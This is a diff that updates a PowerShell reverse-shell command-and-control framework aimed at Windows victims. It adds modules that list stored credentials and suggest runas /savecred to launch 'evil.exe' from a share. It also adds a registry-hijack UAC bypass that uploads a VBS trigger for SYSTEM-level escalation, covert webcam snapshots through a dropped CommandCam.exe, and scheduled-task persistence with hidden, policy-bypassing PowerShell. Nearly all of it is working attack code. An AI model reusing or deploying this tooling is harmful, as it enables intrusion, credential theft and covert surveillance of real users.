@@ -1,12 +1,12 @@
 <#
 .Author:
-   @ZHacker13 &('r00t-3xp10it') version 2.8
+   @ZHacker13 &('r00t-3xp10it') version 2.9
 
 .DESCRIPTION:
    ReverseTCPShell - Framework. This PS1 starts a listener Server on a Windows attacker machine and generate oneline revshell
    payloads for CMD and PS to be executed on the victim machine. You can use the generated oneline revshell payload also via
    netcat on linux. (in this case you will lose the C2 functionalities like screenshot, upload and download files). If this
-   framework is executed using venom v1.0.16 framework {amsi evasion nÂº4} then linux users will not lost C2 functionalities
+   framework is executed using venom v1.0.16 framework {amsi evasion nº4} then linux users will not lost C2 functionalities
    and the target connection terminal window will be executed hidden with the help of dropper.bat script.
 
 .EXECUTION:
@@ -394,6 +394,7 @@ While($Client.Connected)
       write-host "   ListTask  List Remote-Host Schedule Tasks";
       write-host "   StartUp   List Remote-Host StartUp Folder";
       write-host "   ListRece  List Remote-Host Recent Folder";
+      write-host "   ListCred  List cmdkey stored credentials";
       write-host "   ListPriv  List Remote-Host Folder Permitions";
       write-host "   ListDriv  List Remote-Host Drives Available";
       write-host "   ListRun   List Remote-Host Startup Run Entrys";
@@ -441,6 +442,13 @@ While($Client.Connected)
         ## $path = "$env:userprofile\AppData\Roaming\Microsoft\Windows\Recent"
         write-host " List of Remote-Host Recent Contents." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
         $Command = "powershell dir `$env:userprofile\AppData\Roaming\Microsoft\Windows\Recent `> startup.txt;Get-content startup.txt;Remove-Item startup.txt -Force";
+      }
+      If($choise -eq "ListCred" -or $choise -eq "cred")
+      {
+        write-host " List of Remote-Host cmdkey stored Credentials." -ForegroundColor Blue -BackgroundColor White;
+        write-host " Attacker can use Runas with the /savecred options in order to use the saved creds." -ForegroundColor Green;
+        write-host " runas /savecred /user:WORKGROUP\Administrator `"\\10.XXX.XXX.XXX\SHARE\evil.exe`"" -ForegroundColor Green;Start-Sleep -Seconds 2;write-host "`n";
+        $Command = "cmd /R cmdkey /list `> dellog.txt;`$check_keys = Get-Content dellog.txt|Select-string `"User:`";If(-not (`$check_keys)){echo `"   [i] None Stored Credentials Found ...`" `> test.txt;Get-Content text.txt;Remove-Item text.txt -Force}else{Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
       }
       If($choise -eq "ListPriv" -or $choise -eq "Priv")
       {
@@ -771,6 +779,8 @@ While($Client.Connected)
       ## Post-Exploiation Modules (red-team)
       write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
       write-host "   -------   -----------                     ------";
+      write-host "   Escalate  Escalate Privileges             Client User-Land to NT/System";
+      write-host "   CamSnap   WebCam Screenshot               Take a screenshot using webcam";
       write-host "   Persist   Remote Persist Client           Execute Client on every startup";
       write-host "   Restart   Restart in xx seconds           Restart Remote-Host with MsgBox";
       write-host "   ListLog   List/Delete EventLogs           Remote List/Delete eventvwr Logs";
@@ -781,7 +791,6 @@ While($Client.Connected)
       write-host "   LockPC    Lock Remote WorkStation         Lock Remote workstation (rundll32)";
       write-host "   SpeakPC   Make Remote-Host Speak          Input Frase for Remote-Host to Speak";
       write-host "   AMSIset   Turn On/Off AMSI (reg)          Client:User OR Admin Priv Required";
-      write-host "   cmdCred   List cmdkey stored creds        Client:User  - Privileges Required";
       write-host "   UACSet    Turn On/Off remote UAC          Client:Admin - Privileges Required";
       write-host "   ASLRSet   Turn On/Off remote ASLR         Client:Admin - Privileges Required";
       write-host "   TaskMan   Turn On/off TaskManager         Client:Admin - Privileges Required";
@@ -791,7 +800,132 @@ While($Client.Connected)
       write-host "   NoDrive   Hide Drives from Explorer       Client:Admin - Privileges Required";
       write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
       write-host "`n`n :meterpeter:Post> " -NoNewline -ForeGroundColor Green;
-      $choise = Read-Host;   
+      $choise = Read-Host;
+      If($choise -eq "Escalate" -or $choice -eq "escalate")
+      {
+        write-host "`n`n   Modules     Description                  Remark" -ForegroundColor green;
+        write-host "   -------     -----------                  ------";
+        write-host "   getsystem   Escalate Client Privileges   Client:User  - Privileges required";
+        write-host "   Delete      Delete Priv Escal settings   Client:User  - Privileges required";
+        write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
+        write-host "`n`n :meterpeter:Post:Escalate> " -NoNewline -ForeGroundColor Green;
+        $Escal_choise = Read-Host;
+        If($Escal_choise -eq "GetSystem" -or $Escal_choise -eq "getsystem")
+        {
+          $name = "trigger.vbs";
+          $File = "$Bin$name"
+          If(([System.IO.File]::Exists("$File")))
+          {
+            write-host " - Input Delay Time (sec): " -NoNewline;
+            $Input_Delay = Read-Host;
+            If(-not ($Input_Delay)){$Input_Delay = "120"}
+            $trigger = "WStore.vbs";
+            $trigger_File = "$IPATH$trigger";
+            $Delay_Time = "$Input_Delay"+"000";
+            Copy-Item -Path $File -Destination $trigger_File -Force;
+            ((Get-Content -Path $trigger_File -Raw) -Replace "120000","$Delay_Time")|Set-Content -Path $trigger_File;
+            write-host " Elevate Client ($payload_name.ps1) Privileges." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
+            Write-Host "   Status   Remote Path           Delay" -ForeGroundColor green;
+            Write-Host "   ------   ----------            ------";
+            Write-Host "   Upload   `$env:tmp\WStore.vbs   $Input_Delay(sec)`n`n";
+            Write-Host "   [i] Exit|Restart meterpeter (use same ip|port|obfuscation)" -ForeGroundColor yellow;
+            Write-Host "   [i] to recive the elevated Connection back in xx seconds." -ForeGroundColor yellow;
+            ## Write Local script (trigger.vbs) to Remote-Host $env:tmp
+            $FileBytes = [io.file]::ReadAllBytes("$trigger_File") -join ',';
+            $FileBytes = "($FileBytes)";
+            $File = $File.Split('\')[-1];
+            $File = $File.Split('/')[-1];
+            $Command = "`$1=`"`$env:tmp\WStore.vbs`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"};`$cmdline = `"cmd /R start powershell -exec bypass -w 1 -File `$env:tmp\Update-KB4524147.ps1`";`$CommandPath = `"HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command`";New-Item `$CommandPath -Force|Out-Null;New-ItemProperty -Path `$CommandPath -Name `"DelegateExecute`" -Value `"`" -Force|Out-Null;Set-ItemProperty -Path `$CommandPath -Name `"(default)`" -Value `$cmdline -Force -ErrorAction SilentlyContinue|Out-Null;echo `"   Saved   `$env:tmp\WStore.vbs`" `> privescal.txt;cmd /R start %tmp%\WStore.vbs";
+            ## $Command = Variable_Obfuscation(Character_Obfuscation($Command));
+            $Command = $Command -replace "@","$FileBytes";
+            $File = "`$env:tmp\WStore.vbs";
+            $Upload = $True;
+          }else{
+            ## Local File { trigger.vbs } not found .
+            Write-Host "`n`n   Status     Local Path" -ForeGroundColor green;
+            Write-Host "   ------     ----------";
+            Write-Host "   Not Found  $File" -ForeGroundColor red;
+            $File = $Null;
+            $Command = $Null;
+            $Upload = $False; 
+          }
+        }
+        If($Escal_choise -eq "Delete" -or $Escal_choise -eq "del")
+        {
+          write-host " Delete Privilege Escalation Old Files|Configurations." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
+          $Command = "`$CommandPath = `"HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command`";If(Test-Path `$CommandPath){Remove-Item `$CommandPath -Recurse -Force;cmd /R del /Q /F %tmp%\WStore.vbs;echo `"   [i] Privilege Escalation Registry hive Deleted ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Privilege Escalation Vulnerable Registry hive: [NOT FOUND] ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R del /Q /F %tmp%\WStore.vbs}";
+        }
+        If($Escal_choise -eq "Return" -or $Escal_choise -eq "return" -or $Escal_choise -eq "cls" -or $Escal_choise -eq "Modules" -or $Escal_choise -eq "modules" -or $Escal_choise -eq "clear")
+        {
+          $File = $Null;
+          $choise = $Null;
+          $Command = $Null;
+          $trigger = $Null;
+          $Escal_choise = $Null;
+          $trigger_File = $Null;
+          $Input_Delay = $Null;
+        }
+      }
+      If($choise -eq "CamSnap" -or $choise -eq "snap")
+      {
+        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
+        write-host "   -------   -----------                     ------";
+        write-host "   Device    List WebCam Devices             Client:User  - Privileges required";
+        write-host "   Snap      Take WebCam Screenshot          Client:User  - Privileges required";
+        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
+        write-host "`n`n :meterpeter:Post:Snap> " -NoNewline -ForeGroundColor Green;
+        $Cam_choise = Read-Host;
+        If($Cam_choise -eq "Snap" -or $Cam_choise -eq "snap")
+        {
+          $name = "CommandCam.exe";
+          $File = "$Bin$name"
+          If(([System.IO.File]::Exists("$File")))
+          {
+            $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
+            $FileBytes = "($FileBytes)";
+            $File = $File.Split('\')[-1];
+            $File = $File.Split('/')[-1];
+            $Command = "`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R start /min %tmp%\CommandCam.exe /quiet;cmd /R del /Q /F %tmp%\CommandCam.exe}";
+            $Command = $Command -replace "#","$File";
+            $Command = $Command -replace "@","$FileBytes";
+            $Camflop = "True";
+            $Upload = $True;
+          } Else {
+            Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
+            Write-Host "   ------   ---------";
+            Write-Host "   Failed   File Missing: $File" -ForeGroundColor red;
+            $Command = $Null;
+          }
+        }
+        If($Cam_choise -eq "Device" -or $Cam_choise -eq "device")
+        {
+          $name = "CommandCam.exe";
+          $File = "$Bin$name"
+          If(([System.IO.File]::Exists("$File")))
+          {
+            $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
+            $FileBytes = "($FileBytes)";
+            $File = $File.Split('\')[-1];
+            $File = $File.Split('/')[-1];
+            $Command = "`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R %tmp%\CommandCam.exe /devlist|findstr /C:`"Device name:`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R del /Q /F %tmp%\CommandCam.exe}";
+            $Command = $Command -replace "#","$File";
+            $Command = $Command -replace "@","$FileBytes";
+            $Upload = $True;
+            $Cam_set = "True";
+          } Else {
+            Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
+            Write-Host "   ------   ---------";
+            Write-Host "   Failed   File Missing: $File" -ForeGroundColor red;
+            $Command = $Null;
+          }
+        }
+        If($Cam_choise -eq "Return" -or $Cam_choise -eq "return" -or $Cam_choise -eq "cls" -or $Cam_choise -eq "Modules" -or $Cam_choise -eq "modules" -or $Cam_choise -eq "clear")
+        {
+          $choise = $Null;
+          $Command = $Null;
+          $Cam_choise = $Null;
+        }
+      }
       If($choise -eq "Persist" -or $choise -eq "persist")
       {
         write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
@@ -846,7 +980,7 @@ While($Client.Connected)
           Write-Host "   $onjuyhg   $execapi";
           write-host "`n";
           ## Settings: ($stime == time-interval) | (/st 00:00 /du 0003:00 == 3 hours duration)
-          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$onjuyhg`" /tr `"powershell -version 2 -Execution Bypass -windowstyle hidden -NoProfile -File $execapi`";schtasks /Query /tn `"$onjuyhg`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force}else{cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$onjuyhg`" /tr `"powershell -Execution Bypass -windowstyle hidden -NoProfile -File $execapi`";schtasks /Query /tn `"$onjuyhg`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force}}else{cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$onjuyhg`" /tr `"powershell -Execution Bypass -windowstyle hidden -NoProfile -File $execapi`";schtasks /Query /tn `"$onjuyhg`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force}";
+          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$onjuyhg`" /tr `"powershell -version 2 -Execution Bypass -windowstyle hidden -NoProfile -File `"$execapi`"`";schtasks /Query /tn `"$onjuyhg`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force}else{cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$onjuyhg`" /tr `"powershell -Execution Bypass -windowstyle hidden -NoProfile -File `"$execapi`"`";schtasks /Query /tn `"$onjuyhg`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force}}else{cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$onjuyhg`" /tr `"powershell -Execution Bypass -windowstyle hidden -NoProfile -File `"$execapi`"`";schtasks /Query /tn `"$onjuyhg`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force}";
         }    
         If($startup_choise -eq "WinLogon" -or $startup_choise -eq "logon")
         {
@@ -860,10 +994,10 @@ While($Client.Connected)
           }
         If($startup_choise -eq "Return" -or $startup_choise -eq "return" -or $logs_choise -eq "cls" -or $logs_choise -eq "Modules" -or $logs_choise -eq "modules" -or $logs_choise -eq "clear")
         {
-            $choise = $Null;
-            $Command = $Null;
-            $startup_choise = $Null;
-          }
+          $choise = $Null;
+          $Command = $Null;
+          $startup_choise = $Null;
+        }
       }
       If($choise -eq "Restart" -or $choise -eq "restart")
       {
@@ -1014,13 +1148,6 @@ While($Client.Connected)
           $choise_two = $Null;
         }
         $choise_two = $Null;
-      }
-      If($choise -eq "CmdCred" -or $choise -eq "cred")
-      {
-        write-host " List of Remote-Host cmdkey stored Credentials." -ForegroundColor Blue -BackgroundColor White;
-        write-host " Attacker can use Runas with the /savecred options in order to use the saved creds." -ForegroundColor Green;
-        write-host " runas /savecred /user:WORKGROUP\Administrator `"\\10.XXX.XXX.XXX\SHARE\evil.exe`"" -ForegroundColor Green;Start-Sleep -Seconds 2;write-host "`n";
-        $Command = "cmd /R cmdkey /list `> dellog.txt;`$check_keys = Get-Content dellog.txt|Select-string `"User:`";If(-not (`$check_keys)){echo `"   [i] None Stored Credentials Found ...`" `> test.txt;Get-Content text.txt;Remove-Item text.txt -Force}else{Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
       }
       If($choise -eq "UACSet" -or $choise -eq "uac")
       {
@@ -1443,13 +1570,28 @@ While($Client.Connected)
       {
         If($OutPut -ne " ")
         {
-          $OutPut = $OutPut -replace "`n","";
-          Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
-          Write-Host "   ------   ---------";
-          Write-Host "   saved    $OutPut";
+          If($Cam_set -eq "True")
+          {
+            $OutPut = $OutPut -replace "`n","";$final = $OutPut -replace "WebCamCommandCam.exe","";
+            write-host "`n`n  WebCam(s) Detected" -ForeGroundColor Green;
+            write-host "  ------------------";
+            Write-Host "  $final";
+            $Cam_set = "False";
+          }else{
+            $OutPut = $OutPut -replace "`n","";
+            Write-Host "`n`n   Status   File Path" -ForeGroundColor green;
+            Write-Host "   ------   ---------";
+            Write-Host "   saved    $OutPut";
+          }
           If($Flipflop -eq "True")
           {
-          write-host "   Remark   Client:Admin triggers 'amsistream-ByPass(PSv2)'" -ForeGroundColor yellow;Start-Sleep -Seconds 1;
+            write-host "   Remark   Client:Admin triggers 'amsistream-ByPass(PSv2)'" -ForeGroundColor yellow;Start-Sleep -Seconds 1;
+            $Flipflop = "False";
+          }
+          If($Camflop  -eq "True")
+          {
+            write-host "   image    $env:tmp\image.bmp" -ForeGroundColor yellow;Start-Sleep -Seconds 1;
+            $Camflop = "False";
           }
           $Command = $Null;
         } Else {
